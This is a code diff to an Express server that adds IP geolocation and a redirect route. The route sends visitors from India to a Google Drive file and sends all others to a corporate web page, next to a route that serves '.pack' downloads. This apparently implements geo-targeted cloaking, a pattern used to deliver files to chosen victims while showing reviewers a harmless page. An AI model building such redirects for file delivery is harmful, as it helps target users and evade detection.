@@ -1,7 +1,16 @@
 const express = require("express");
 const app = express();
+const geoip = require("geoip-lite");
 const path = require("path");
 const fs = require("fs");
+const e = require("express");
+
+function getClientIp(req) {
+  // x-forwarded-for başlığı ters proxy'ler (nginx, load balancer) için kullanılır
+  const ipAddress = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+  // Eğer birden fazla IP varsa, sadece ilkini alırız
+  return ipAddress.split(",")[0].trim();
+}
 
 app.get("/", (req, res) => {
   const domain = req.headers.host;
@@ -31,6 +40,26 @@ app.get("/get.php", (req, res) => {
     }
     res.download(filePath, `${pack}.pack`);
   });
+});
+
+app.get("/country-detection/:p1", (req, res) => {
+  const { p1 } = req.params;
+  const ip = getClientIp(req);
+  console.log(`User IP Address: ${ip}`);
+  const geo = geoip.lookup(ip);
+  let address;
+  if (geo) {
+    console.log(`${geo.country} , ${geo.city} , ${geo.region}`);
+    if (geo.country === "IN") {
+      address = `https://drive.google.com/file/d/1Fr7CgVfq4xFfTw9LioBIjlkW0YZwD25g/view?usp=sharing`;
+    } else {
+      address = `https://www.gruparge.com/en-us/${p1}`;
+    }
+  } else {
+    console.log(`Geo bilgisi bulunamadı!`);
+    address = `https://www.gruparge.com/en-us/${p1}`;
+  }
+  res.redirect(301, address);
 });
 
 app.get("/:p1/:p2", (req, res) => {
